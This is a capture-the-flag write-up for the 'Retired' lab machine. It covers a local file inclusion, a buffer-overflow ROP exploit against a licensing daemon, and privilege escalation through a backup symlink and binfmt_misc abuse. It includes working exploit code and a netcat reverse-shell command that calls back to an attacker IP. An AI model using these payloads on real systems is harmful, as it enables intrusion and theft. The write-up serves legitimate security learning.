---
description: LFI --> BOF --> RCE (Writeup used)
---

# Retired

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.96     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 23:13 EDT
Nmap scan report for 10.129.227.96
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### LFI --> activate\_license Binary

When we visit port 80, there's an obvious LFI present:

<figure><img src="../../../.gitbook/assets/image (2500).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1796).png" alt=""><figcaption></figcaption></figure>

I was a bit lazy, so I created a quick Python script to read the files:

```python
import os

while True:
	file = input("File: ")
	os.system(f'curl http://10.129.227.96/index.php?page=../../../../../../../..{file}')
```

I still ran a `gobuster` scan to enumerate any other pages:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.227.96 -x html,txt,php -t 100 -k
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.227.96
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2023/05/10 23:19:47 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> /index.php?page=default.html]
/default.html         (Status: 200) [Size: 11414]
/assets               (Status: 301) [Size: 162] [--> http://10.129.227.96/assets/]
/css                  (Status: 301) [Size: 162] [--> http://10.129.227.96/css/]
/beta.html            (Status: 200) [Size: 4144]
/js                   (Status: 301) [Size: 162] [--> http://10.129.227.96/js/]
```

`beta.html` contained a file upload that did nothing, but it revealed some information regarding an `activate_license` application present:

<figure><img src="../../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

We can fuzz to find this binary somewhere. Create a quck file with PATH variables:

```
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
/usr/local/games
/usr/games
```

Then, use `wfuzz` to find the `activate_license` binary.&#x20;

```
$ wfuzz -c -w path_variables -u http://10.129.227.96/index.php?page=../../../../../../../..FUZZ/activate_license /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.227.96/index.php?page=../../../../../../../..FUZZ/activate_license
Total requests: 8

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000001:   302        0 L      0 W        0 Ch        "/usr/local/sbin"           
000000003:   302        0 L      0 W        0 Ch        "/usr/sbin"                 
000000008:   302        0 L      0 W        0 Ch        "/usr/games"                
000000007:   302        0 L      0 W        0 Ch        "/usr/local/games"          
000000005:   302        0 L      0 W        0 Ch        "/sbin"                     
000000002:   302        0 L      0 W        0 Ch        "/usr/local/bin"            
000000004:   302        53 L     462 W      22501 Ch    "/usr/bin
```

Seems that `/usr/bin/activate_license` is where it is at. We can download this and try to run it:

```
$ curl http://10.129.227.96/index.php?page=../../../../../../../../usr/bin/activate_license
$ ./activate_license 
Error: specify port to bind to

$ file activate_license
activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped
```

This confirms that this is a binary exploitation challenge. We can being with reverse engineering the binary in `ghidra`.

Anyways, we can continue with our enumeration of the webpages. We can use this LFI to read the source code of the pages. There was an `activate_license.php` file here too.&#x20;

```php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

It seems that this thing takes the input from the file we uploaded and sends it to the `activate_license` file on port 1337. We can grab this file and run it on our own PHP server.

```
$ php -S localhost:8000
```

Our script would have to send input to this file in order for it to be sent to the binary.&#x20;

### Proc + Binary Enum

We can continue to enumerate the processes present on the server. First, I want to enumerate what PID is the `activate_license` binary using:

```
$ wfuzz -z range,1-65535 -u 'http://10.129.227.96/index.php?page=../../../../../../../../proc/FUZZ/cmdline' --ss license /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.227.96/index.php?page=../../../../../../../../proc/FUZZ/cmdline
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000432:   302        0 L      1 W        31 Ch       "432"
```

Then, we can find out what is being run:

```
$ curl http://10.129.227.96/index.php?page=../../../../../../../proc/432/cmdline -o test

$ cat test                                                                                                                                                                    
/usr/bin/activate_license1337
```

We can then enumerate `/proc/432/maps` in order to see the libraries loaded in memory space.

```
$ curl http://10.129.227.96/index.php?page=../../../../../../../proc/432/maps
7f7d0d2c7000-7f7d0d2c9000 rw-p 00000000 00:00 0 
7f7d0d2c9000-7f7d0d2ca000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f7d0d2ca000-7f7d0d2cc000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f7d0d2cc000-7f7d0d2cd000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f7d0d2cd000-7f7d0d2ce000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f7d0d2ce000-7f7d0d2cf000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f7d0d2cf000-7f7d0d2d6000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f7d0d2d6000-7f7d0d2e6000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f7d0d2e6000-7f7d0d2eb000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f7d0d2eb000-7f7d0d2ec000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f7d0d2ec000-7f7d0d2ed000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f7d0d2ed000-7f7d0d2f1000 rw-p 00000000 00:00 0 
7f7d0d2f1000-7f7d0d300000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f7d0d300000-7f7d0d39a000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
<TRUNCATED>
```

### Ghidra + Offset

First we can see that PIE is enabled on this binary:

```
gdb-peda$ checksec activate_license
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

NX is also enabled, so we probably need to do a Ret2Libc exploit after leaking the `libc` address. Within the `activate_license` function, there's a BOF vulnerability due to the hardcoded buffer length and lack of length validation. Furthermore, the first 4 characters read from input are the buffer length used:

<figure><img src="../../../.gitbook/assets/image (2274).png" alt=""><figcaption></figcaption></figure>

So we can probably overwrite this with a huge number of bytes. I ran the binary on my own machine on port 5555, and it seems to take some input.&#x20;

<figure><img src="../../../.gitbook/assets/image (3915).png" alt=""><figcaption></figcaption></figure>

From reading `ghidra`, it appears that it does some SQL stuff with our input after getting it:

<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

So from this, it seems that the binary uses both `libc` and `libsqlite3` within this function. We can download both of them from the machine itself.&#x20;

From reading a writeup, I learned that because we have access to the `libc` files directly, we can actually call `mprotect`. This function would basically make the stack executable, allowing us to inject shellcode instead of hopping all over the place with a Ret2Libc.

```
$ readelf -s libc-2.31.so| grep mprotect
  1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 mprotect@@GLIBC_2.2.5
```

{% embed url="https://man7.org/linux/man-pages/man2/mprotect.2.html" %}

However, it should be noted that it is possible to run the exploit even without this. This is because we can just call `system` to execute our shell instead.

Now, we need to figure out how to cause a crash in the binary such that we can control the execution flow. &#x20;

```
$ gdb -q --args ./activate_license 1337
Reading symbols from ./activate_license...
gdb-peda$ set follow-fork-mode child
gdb-peda$ run
Starting program: /home/kali/htb/retired/activate_license 1337
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1337
[+] listening ...
```

Afterwards, we can create a quick Python script to send the input:

{% code overflow="wrap" %}
```python
from pwn import *
import sys
msg = sys.argv[1].encode()
r = remote('localhost', 1337)
r.send(p32(len(msg), endian='big'))
r.send(msg)
```
{% endcode %}

When run, our `gdb` window shows that it crashes with a pattern of length 2000.

```
[----------------------------------registers-----------------------------------]
RAX: 0x2d6 
RBX: 0x7fffffffde98 --> 0x7fffffffe1ff ("/home/kali/htb/retired/activate_license")
RCX: 0x0 
RDX: 0x0 
RSI: 0x5555555592a0 ("[+] activated license: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAA"...)
RDI: 0x7fffffffd580 --> 0x7ffff7cb0e70 (<__funlockfile>:        mov    rdi,QWORD PTR [rdi+0x88])
RBP: 0x4e73413873416973 ('siAs8AsN')
RSP: 0x7fffffffdd18 ("AsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
RIP: 0x5555555555c0 (<activate_license+643>:    ret)
R8 : 0x555555559535 ("BEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177\n")
R9 : 0x7ffff7dcd580 (<__memcpy_ssse3+320>:      movaps xmm1,XMMWORD PTR [rsi+0x10])
R10: 0x0 
R11: 0x202 
R12: 0x0 
R13: 0x7fffffffdeb0 --> 0x7fffffffe22c ("COLORFGBG=15;0")
R14: 0x0 
R15: 0x7ffff7ffd020 --> 0x7ffff7ffe2e0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555555b9 <activate_license+636>:       call   0x5555555550b0 <printf@plt>
   0x5555555555be <activate_license+641>:       nop
   0x5555555555bf <activate_license+642>:       leave  
=> 0x5555555555c0 <activate_license+643>:       ret    
   0x5555555555c1 <main>:       push   rbp
   0x5555555555c2 <main+1>:     mov    rbp,rsp
   0x5555555555c5 <main+4>:     sub    rsp,0x60
   0x5555555555c9 <main+8>:     mov    DWORD PTR [rbp-0x54],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd18 ("AsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
0008| 0x7fffffffdd20 ("OAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
0016| 0x7fffffffdd28 ("slAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
0024| 0x7fffffffdd30 ("AsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
0032| 0x7fffffffdd38 ("SAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
0040| 0x7fffffffdd40 ("sqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
0048| 0x7fffffffdd48 ("AsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
0056| 0x7fffffffdd50 ("WAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6\377\177")
[------------------------------------------------------------------------------]
```

We have overflowed the stack, and we can check the offset:

```
gdb-peda$ x/xg $rsp
0x7fffffffdd18: 0x73413973416a7341
gdb-peda$ pattern_offset 0x73413973416a7341
8304982355029422913 found at offset: 520
```

So we have an offset of 520.&#x20;

### Exploitation

I didn't really know how to craft this exploit, so I'll be using the official guide's script and trying to understand it.

First, since we can read the read the proc maps area, we can find the base addresses of which `libc` and the binary are loaded:

```python
license_base = 0x5556022af000
libc_base = 0x7f7d0d435000
```

Then, we can find the `system` function, ROP gadgets and a **writeable section of memory** using these base addresses:

```python
system = p64(libc_base + 0x0000000000048e50)
writeable = p64(license_base + 0x4000)
pop_rdi = p64(license_base + 0x0000181b) # pop rdi; ret;
pop_rdx = p64(libc_base + 0x000cb1cd) # pop rdx; ret;
mov = p64(libc_base + 0x0003ace5) # mov qword ptr [rdi], rdx; ret;
```

Then once we have these, we can use this to find the offset and write a `system` command to the binary. The script used in the guide uses a basic `bash` shell and inserts it in:

```python
cmd = b"bash -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 7777 >/tmp/f' \x00"
```

Then, the ROP chaining occurs, where the command is written into the memory space 8 bytes at a time:

```python
for i in range(0,len(cmd),8):
		rop += pop_rdi
		rop += p64(writable + i)
		rop += pop_rdx
		rop += cmd[i:i+8].ljust(8, b"\x00")
		rop += mov
```

Afterwards, the whole ROP chain is written into a file and sent to the remote web server. This is done because the web server accepts file uploads and sends the file contents directly to the `activate_license` binary, which would trigger the shell.

```python
rop += pop_rdi
	rop += p64(writable)
	rop += system
	with open('getshell.key','wb') as f:
		f.write(rop)
	files = {"licensefile": ("getshell.key", open("getshell.key","rb"),
	'application/x-iwork-keynote-sffkey')}
	requests.post(f"http://10.129.227.96/activate_license.php", files=files)
```

If this script is run, it gives us a reverse shell that we can upgrade.

<figure><img src="../../../.gitbook/assets/image (1264).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Backup Symlink Exploit

The first few things we notice is that there's a few backup zip files in the directory we are in:

```
www-data@retired:/var/www$ ls -la
total 1512
drwxrwsrwx  3 www-data www-data   4096 May 11 04:59 .
drwxr-xr-x 12 root     root       4096 Mar 11  2022 ..
-rw-r--r--  1 dev      www-data 505153 May 11 04:57 2023-05-11_04-57-01-html.zip
-rw-r--r--  1 dev      www-data 505153 May 11 04:58 2023-05-11_04-58-09-html.zip
-rw-r--r--  1 dev      www-data 505153 May 11 04:59 2023-05-11_04-59-01-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11  2022 html
-rw-r--r--  1 www-data www-data  12288 May 11 04:55 license.sqlite
```

If we list the timers, we can see that there's a website\_backup script being run somewhere:

```
www-data@retired:/var/www$ systemctl list-timers
NEXT         LEFT         LAST          PASSED       UNIT          ACTIVATES
Thu 2023-05… 35s left     Thu 2023-05-… 23s ago      website_back… website_back…
```

I ran a `grep` to view files that had `html.zip` within them and found one:

```
www-data@retired:/var/www$ grep -r / -e 'html.zip' 2> /dev/null
/usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
```

Here's teh script contents:

```bash
#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

This thing backs up the entire `/var/www/html` directory and zips it. This is exploitable because we can create a symlink to the entire `/home/dev` directory within the backup file.

```
www-data@retired:/var/www/html$ ln -s /home/dev/ file
```

Then we wait for the script to run again, and unzip the latest file:

```
www-data@retired:/var/www$ unzip 2023-05-11_05-07-01-html.zip
<TRUNCATED>
inflating: var/www/html/file/.ssh/id_rsa.pub  
inflating: var/www/html/file/.ssh/authorized_keys  
inflating: var/www/html/file/.ssh/id_rsa
<TRUNCATED>
```

We can see that it works, and now we can grab the user's private key and `ssh` in. We can then grab the user flag.

### Emuemu

Within the user's directory, there's an `emuemu` folder:

```
dev@retired:~$ ls
activate_license  emuemu  user.txt

dev@retired:~/emuemu$ ls -la
total 68
drwx------ 3 dev dev  4096 Mar 11  2022 .
drwx------ 6 dev dev  4096 Mar 11  2022 ..
-rw------- 1 dev dev   673 Oct 13  2021 Makefile
-rw------- 1 dev dev   228 Oct 13  2021 README.md
-rw------- 1 dev dev 16608 Oct 13  2021 emuemu
-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c
-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper
-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c
drwx------ 2 dev dev  4096 Mar 11  2022 test
```

The contents of `reg_helper.c` is rather interesting:

```c
int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
```

This file is executable by us, and it seems to use `binfmt_misc` or something. The `Makefile` would create the binary and within it, it runs `setcap`:

```bash
dev@retired:~/emuemu$ cat Makefile 
CC := gcc
CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion

SOURCES := $(wildcard *.c)
TARGETS := $(SOURCES:.c=)

.PHONY: install clean

install: $(TARGETS)
        @echo "[+] Installing program files"
        install --mode 0755 emuemu /usr/bin/
        mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
        install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
        setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper

        @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
        echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
                | tee /usr/lib/binfmt.d/emuemu.conf \
                | /usr/lib/emuemu/reg_helper

clean:
        rm -f -- $(TARGETS)
```

So this bianry has `cap_dac_override` capability. There are some exploits for `binfmt_misc` that would spawn a `root` shell if we can write to the `/proc/sys/fs/binfmt_misc/register` file, of which this binary can.

{% embed url="https://github.com/toffan/binfmt_misc" %}

We have to edit the exploit a bit. First we can remove all the checks on the writeability of the above file:

```bash
#function not_writeable()
#{
#	test ! -w "$mountpoint/register"
#}

# not_writeable && die "Error: $mountpoint/register is not writeable"
```

Then, since `reg_helper` is the binary that is allowed to write to that file, we have to change the last few lines of the exploit to use that binary instead:

```bash
binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
echo "$binfmt_line" | /usr/lib/emuemu/reg_helper

exec "$target"
```

The `/usr/lib/emuemu/reg_helper` binary is used because it is owned by `root`. The one within our home directory is owned by us, so it won't work in bypassing restrictions. After downloading it and running it, we would get a `root` shell.

<figure><img src="../../../.gitbook/assets/image (2228).png" alt=""><figcaption></figcaption></figure>

This machine was hard for me, and I used a writeup for initial access and `emuemu` exploitation.&#x20;

{% embed url="https://0xdf.gitlab.io/2022/08/13/htb-retired.html#abuse-binfmt_misc" %}

{% embed url="https://pencer.io/ctf/ctf-htb-retired/#ssh-as-dev" %}
